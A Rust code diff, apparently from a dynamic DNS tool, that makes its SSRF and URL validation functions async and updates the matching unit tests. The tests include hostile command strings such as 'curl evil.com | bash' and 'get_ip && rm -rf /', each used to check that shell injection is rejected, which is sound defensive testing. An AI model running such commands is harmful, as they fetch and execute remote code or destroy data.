@@ -157,7 +157,7 @@ fn validate_basic_limits(config: &AppConfig) -> Result<(), AppError> {
 }
 
 /// 校验 DNS 任务名称唯一性与 URL 端点合法性
-fn validate_task_configs(tasks: &[DnsTaskConfig]) -> Result<(), AppError> {
+async fn validate_task_configs(tasks: &[DnsTaskConfig]) -> Result<(), AppError> {
     let mut task_names = HashSet::with_capacity(tasks.len());
     for task in tasks {
         let name = task.name.trim();
@@ -190,12 +190,14 @@ fn validate_task_configs(tasks: &[DnsTaskConfig]) -> Result<(), AppError> {
                 for url in &ip_cfg.url_endpoints {
                     let trimmed = url.trim();
                     if !trimmed.is_empty() {
-                        crate::util::net::validate_safe_url_endpoint(trimmed).map_err(|e| {
-                            AppError::bad_request(format!(
-                                "任务 [{}] 中的 URL 端点 [{}] 非法: {}",
-                                name, trimmed, e
-                            ))
-                        })?;
+                        crate::util::net::validate_safe_url_endpoint(trimmed)
+                            .await
+                            .map_err(|e| {
+                                AppError::bad_request(format!(
+                                    "任务 [{}] 中的 URL 端点 [{}] 非法: {}",
+                                    name, trimmed, e
+                                ))
+                            })?;
                     }
                 }
             } else if ip_cfg.source_type == IpSourceType::Command {
@@ -219,40 +221,43 @@ fn validate_task_configs(tasks: &[DnsTaskConfig]) -> Result<(), AppError> {
     Ok(())
 }
 
-/// 校验通知渠道配置中的 URL 地址合法性（防范 SSRF 攻击）
-pub(crate) fn validate_notification_urls(notif: &NotificationConfig) -> Result<(), AppError> {
-    let check_url = |url: &str, name: &str| -> Result<(), AppError> {
-        let s = url.trim();
-        if !s.is_empty() {
-            crate::util::net::validate_safe_url_endpoint(s)
-                .map_err(|e| AppError::bad_request(format!("{}: {}", name, e)))?;
-        }
-        Ok(())
-    };
+/// 校验通知渠道中的单个 URL 地址合法性
+async fn check_notification_url(url: &str, name: &str) -> Result<(), AppError> {
+    let s = url.trim();
+    if !s.is_empty() {
+        crate::util::net::validate_safe_url_endpoint(s)
+            .await
+            .map_err(|e| AppError::bad_request(format!("{}: {}", name, e)))?;
+    }
+    Ok(())
+}
 
+/// 校验通知渠道配置中的 URL 地址合法性（防范 SSRF 攻击）
+pub(crate) async fn validate_notification_urls(notif: &NotificationConfig) -> Result<(), AppError> {
     if let Some(ref bark) = notif.bark {
-        check_url(&bark.server_url, "Bark 通知服务器地址")?;
+        check_notification_url(&bark.server_url, "Bark 通知服务器地址").await?;
     }
     if let Some(ref webhook) = notif.webhook {
-        check_url(&webhook.url, "自定义 Webhook 地址")?;
+        check_notification_url(&webhook.url, "自定义 Webhook 地址").await?;
     }
     if let Some(ref tg) = notif.telegram
         && let Some(ref proxy) = tg.api_proxy
     {
-        check_url(proxy, "Telegram API 代理地址")?;
+        check_notification_url(proxy, "Telegram API 代理地址").await?;
     }
     if let Some(ref wecom) = notif.wecom
         && let Some(ref webhook_url) = wecom.webhook_url
     {
-        check_url(webhook_url, "企业微信机器人 Webhook 地址")?;
+        check_notification_url(webhook_url, "企业微信机器人 Webhook 地址").await?;
     }
     if let Some(ref feishu) = notif.feishu {
-        check_url(&feishu.webhook_url, "飞书机器人 Webhook 地址")?;
+        check_notification_url(&feishu.webhook_url, "飞书机器人 Webhook 地址").await?;
     }
     if let Some(ref email) = notif.email {
         let s = email.smtp_server.trim();
         if !s.is_empty() {
             crate::util::net::validate_safe_host(s, Some(email.smtp_port))
+                .await
                 .map_err(|e| AppError::bad_request(format!("SMTP 服务器地址非法: {}", e)))?;
         }
     }
@@ -322,8 +327,8 @@ pub async fn save_config_handler(
         payload_cfg.into_app_config(old_config.listen_port, old_config.not_allow_wan_access);
 
     validate_basic_limits(&new_config)?;
-    validate_task_configs(&new_config.dns_tasks)?;
-    validate_notification_urls(&new_config.notifications)?;
+    validate_task_configs(&new_config.dns_tasks).await?;
+    validate_notification_urls(&new_config.notifications).await?;
 
     let new_password_hash = if let Some(ref pwd) = payload.new_password
         && !pwd.is_empty()
@@ -414,8 +419,8 @@ type = "cloudflare"
         assert!(task_default.enabled);
     }
 
-    #[test]
-    fn test_save_config_validation_rules() {
+    #[tokio::test]
+    async fn test_save_config_validation_rules() {
         let valid_config = AppConfig {
             dns_tasks: vec![DnsTaskConfig::default()],
             ..Default::default()
@@ -423,7 +428,7 @@ type = "cloudflare"
 
         // 校验合法配置
         assert!(validate_basic_limits(&valid_config).is_ok());
-        assert!(validate_task_configs(&valid_config.dns_tasks).is_ok());
+        assert!(validate_task_configs(&valid_config.dns_tasks).await.is_ok());
         assert!(valid_config.validate().is_ok());
 
         // 校验非法配置条件：检查间隔太小
@@ -447,7 +452,11 @@ type = "cloudflare"
         // 空任务名
         let mut invalid_task_name = valid_config.clone();
         invalid_task_name.dns_tasks[0].name = "  ".to_string();
-        assert!(validate_task_configs(&invalid_task_name.dns_tasks).is_err());
+        assert!(
+            validate_task_configs(&invalid_task_name.dns_tasks)
+                .await
+                .is_err()
+        );
         assert!(invalid_task_name.validate().is_err());
 
         // 校验重复任务名称
@@ -462,7 +471,11 @@ type = "cloudflare"
                 ..Default::default()
             },
         ];
-        assert!(validate_task_configs(&duplicate_tasks.dns_tasks).is_err());
+        assert!(
+            validate_task_configs(&duplicate_tasks.dns_tasks)
+                .await
+                .is_err()
+        );
         assert!(duplicate_tasks.validate().is_err());
 
         // 校验非法的 URL 端点协议
@@ -470,7 +483,11 @@ type = "cloudflare"
         invalid_url_tasks.dns_tasks[0].ipv4.source_type = crate::config::model::IpSourceType::Url;
         invalid_url_tasks.dns_tasks[0].ipv4.url_endpoints =
             vec!["ftp://example.com/ip".to_string()];
-        assert!(validate_task_configs(&invalid_url_tasks.dns_tasks).is_err());
+        assert!(
+            validate_task_configs(&invalid_url_tasks.dns_tasks)
+                .await
+                .is_err()
+        );
         assert!(invalid_url_tasks.validate().is_err());
 
         // 校验非法的通知服务 URL 协议
@@ -484,32 +501,56 @@ type = "cloudflare"
             }),
             ..Default::default()
         };
-        assert!(validate_notification_urls(&invalid_notif_config).is_err());
+        assert!(
+            validate_notification_urls(&invalid_notif_config)
+                .await
+                .is_err()
+        );
 
         // 校验命令提取 IP 的 Shell 注入防范与非空限制
         let mut dangerous_cmd_task = valid_config.clone();
         dangerous_cmd_task.dns_tasks[0].ipv4.source_type =
             crate::config::model::IpSourceType::Command;
         dangerous_cmd_task.dns_tasks[0].ipv4.cmd = Some("curl evil.com | bash".to_string());
-        assert!(validate_task_configs(&dangerous_cmd_task.dns_tasks).is_err());
+        assert!(
+            validate_task_configs(&dangerous_cmd_task.dns_tasks)
+                .await
+                .is_err()
+        );
         assert!(dangerous_cmd_task.validate().is_err());
 
         dangerous_cmd_task.dns_tasks[0].ipv4.cmd = Some("get_ip && rm -rf /".to_string());
-        assert!(validate_task_configs(&dangerous_cmd_task.dns_tasks).is_err());
+        assert!(
+            validate_task_configs(&dangerous_cmd_task.dns_tasks)
+                .await
+                .is_err()
+        );
         assert!(dangerous_cmd_task.validate().is_err());
 
         dangerous_cmd_task.dns_tasks[0].ipv4.cmd = Some("   ".to_string());
-        assert!(validate_task_configs(&dangerous_cmd_task.dns_tasks).is_err());
+        assert!(
+            validate_task_configs(&dangerous_cmd_task.dns_tasks)
+                .await
+                .is_err()
+        );
         assert!(dangerous_cmd_task.validate().is_err());
 
         dangerous_cmd_task.dns_tasks[0].ipv4.cmd = None;
-        assert!(validate_task_configs(&dangerous_cmd_task.dns_tasks).is_err());
+        assert!(
+            validate_task_configs(&dangerous_cmd_task.dns_tasks)
+                .await
+                .is_err()
+        );
         assert!(dangerous_cmd_task.validate().is_err());
 
         // 安全独立命令允许通过
         dangerous_cmd_task.dns_tasks[0].ipv4.cmd =
             Some("/usr/local/bin/get_my_ip --v4".to_string());
-        assert!(validate_task_configs(&dangerous_cmd_task.dns_tasks).is_ok());
+        assert!(
+            validate_task_configs(&dangerous_cmd_task.dns_tasks)
+                .await
+                .is_ok()
+        );
     }
 
     #[tokio::test]
